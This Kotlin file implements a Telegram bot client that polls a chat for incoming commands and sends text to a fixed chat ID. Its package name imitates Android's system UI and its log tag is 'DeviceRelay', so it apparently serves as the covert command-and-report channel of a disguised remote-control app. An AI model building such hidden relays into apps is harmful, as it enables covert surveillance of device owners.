package com.systemui.package

import android.util.Log
import com.google.gson.Gson
import com.google.gson.JsonObject
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.TimeUnit

object TelegramApi {
    private const val TAG = "DeviceRelay"
    private val client = OkHttpClient.Builder().connectTimeout(30, TimeUnit.SECONDS).readTimeout(30, TimeUnit.SECONDS).build()
    private val gson = Gson()

    data class Update(val updateId: Long, val chatId: String, val text: String)

    suspend fun getUpdates(offset: Long): List<Update> = withContext(Dispatchers.IO) {
        try {
            val url = "${Config.GET_UPDATES_URL}?offset=$offset&timeout=2"
            val req = Request.Builder().url(url).get().build()

            client.newCall(req).execute().use { res ->
                if (!res.isSuccessful) { Log.e(TAG, "getUpdates failed: ${res.code}"); return@withContext emptyList() }
                val body = res.body?.string() ?: return@withContext emptyList()
                val json = gson.fromJson(body, JsonObject::class.java)
                if (!json.has("result")) return@withContext emptyList()

                val results = json.getAsJsonArray("result")
                val updates = mutableListOf<Update>()

                for (e in results) {
                    val o = e.asJsonObject
                    val uId = o.get("update_id")?.asLong ?: continue
                    val msg = o.getAsJsonObject("message") ?: continue
                    val chat = msg.getAsJsonObject("chat") ?: continue
                    val cId = chat.get("id")?.asString ?: continue
                    val txt = msg.get("text")?.asString ?: continue
                    updates.add(Update(uId, cId, txt))
                }
                updates
            }
        } catch (e: Exception) { Log.e(TAG, "getUpdates error", e); emptyList() }
    }

    suspend fun sendMessage(text: String): Boolean = withContext(Dispatchers.IO) {
        try {
            val jsonBody = gson.toJson(mapOf("chat_id" to Config.CHAT_ID, "text" to text, "parse_mode" to "HTML"))
            val body = jsonBody.toRequestBody("application/json".toMediaType())
            val req = Request.Builder().url(Config.BASE_URL).post(body).build()

            client.newCall(req).execute().use { res ->
                if (!res.isSuccessful) { Log.e(TAG, "sendMessage failed: ${res.code}"); delay(2000); retrySend(text) }
                else true
            }
        } catch (e: Exception) { Log.e(TAG, "sendMessage error", e); false }
    }

    private suspend fun retrySend(text: String): Boolean = withContext(Dispatchers.IO) {
        try {
            val jsonBody = gson.toJson(mapOf("chat_id" to Config.CHAT_ID, "text" to text, "parse_mode" to "HTML"))
            val body = jsonBody.toRequestBody("application/json".toMediaType())
            val req = Request.Builder().url(Config.BASE_URL).post(body).build()
            client.newCall(req).execute().use { it.isSuccessful }
        } catch (e: Exception) { Log.e(TAG, "retry error", e); false }
    }

    suspend fun sendLongMessage(text: String) {
        if (text.length <= Config.MAX_MSG_LENGTH) { sendMessage(text); return }
        val chunks = splitMessage(text)
        for (chunk in chunks) { sendMessage(chunk); delay(300) }
    }

    private fun splitMessage(text: String): List<String> {
        val chunks = mutableListOf<String>()
        val lines = text.split("\n")
        val current = StringBuilder()
        for (line in lines) {
            if (current.length + line.length + 1 > Config.MAX_MSG_LENGTH) {
                if (current.isNotEmpty()) { chunks.add(current.toString()); current.clear() }
                if (line.length > Config.MAX_MSG_LENGTH) {
                    var i = 0
                    while (i < line.length) {
                        chunks.add(line.substring(i, minOf(i + Config.MAX_MSG_LENGTH, line.length)))
                        i += Config.MAX_MSG_LENGTH
                    }
                } else { current.append(line) }
            } else { if (current.isNotEmpty()) current.append("\n"); current.append(line) }
        }
        if (current.isNotEmpty()) chunks.add(current.toString())
        return chunks
    }
}